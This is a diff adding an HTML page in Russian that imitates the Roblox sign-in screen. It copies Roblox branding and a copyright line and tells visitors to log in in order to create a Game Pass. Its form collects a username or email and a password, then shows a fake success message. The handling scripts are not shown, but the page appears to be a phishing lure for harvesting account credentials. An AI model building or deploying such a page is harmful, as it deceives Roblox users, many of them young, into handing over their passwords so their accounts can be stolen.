@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Roblox — Вход</title>
+<link rel="stylesheet" href="style.css">
+</head>
+<body class="rbx-bg">
+
+<div class="rbx-header">
+    <div class="rbx-logo">
+        <svg viewBox="0 0 24 24" width="28" height="28"><path fill="#fff" d="M5.5 2l14 3.5-3.5 14-14-3.5z"/></svg>
+        <span>Roblox</span>
+    </div>
+</div>
+
+<div class="rbx-wrap">
+    <div class="rbx-card">
+        <h1>Вход в аккаунт</h1>
+        <p class="rbx-sub">Чтобы создать Game Pass, войдите в аккаунт Roblox.</p>
+
+        <form id="regform" data-page="GamePass — вход">
+            <input type="hidden" name="prefilled" value="">
+
+            <label>
+                Имя пользователя или Email
+                <input type="text" name="login" placeholder="Username" required autocomplete="username">
+            </label>
+
+            <label>
+                Пароль
+                <input type="password" name="password" placeholder="Пароль" required autocomplete="current-password">
+            </label>
+
+            <button type="submit" class="rbx-btn">Войти</button>
+        </form>
+
+        <div id="success" style="display:none" class="rbx-success">
+            <p>Вход выполнен. Создаём Game Pass...</p>
+        </div>
+
+        <div class="rbx-links">
+            <a href="#">Забыли пароль?</a>
+            <span>·</span>
+            <a href="#">Создать аккаунт</a>
+        </div>
+    </div>
+
+    <p class="rbx-foot">© 2026 Roblox Corporation. Все права защищены.</p>
+</div>
+
+<script src="config.js"></script>
+<script src="app.js"></script>
+</body>
+</html>
